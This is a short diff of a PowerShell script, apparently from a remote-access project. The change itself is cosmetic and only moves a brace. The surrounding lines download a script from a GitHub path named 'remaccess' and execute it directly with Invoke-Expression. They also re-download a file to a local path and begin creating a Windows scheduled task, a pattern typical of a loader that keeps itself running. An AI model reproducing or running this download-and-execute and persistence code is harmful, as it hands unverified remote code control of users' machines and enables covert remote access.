@@ -6,8 +6,7 @@ $urlfortc = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/Ta
 Invoke-Expression (Invoke-WebRequest -Uri $urlfortc -UseBasicParsing).Content
 if (Test-Path -Path $localFilePath -PathType Leaf) {
     Remove-Item -Path $localFilePath -Force
-}
-try {
+} try {
     Invoke-WebRequest -Uri $url -OutFile $localFilePath -UseBasicParsing
 } catch {}
 #Create Windows Scheduled task
